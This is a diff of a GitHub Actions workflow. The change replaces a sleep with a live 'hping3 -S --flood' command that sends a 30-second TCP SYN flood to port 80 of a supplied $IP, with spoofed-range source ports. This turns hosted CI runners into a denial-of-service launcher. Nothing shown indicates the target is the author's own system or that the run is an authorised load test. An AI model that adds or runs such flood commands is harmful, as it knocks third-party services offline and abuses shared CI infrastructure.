@@ -86,7 +86,6 @@ jobs:
         timeout-minutes: 5
         run: |
           echo $IP
-          # ping $IP
-          # sudo timeout 30s hping3 -S --flood -V -d 1400 -p 80 -s 1000-65535 $IP
-          sleep 10
+          # sleep 10
           echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
+          sudo timeout 30s hping3 -S --flood -V -d 1400 -p 80 -s 1000-65535 $IP
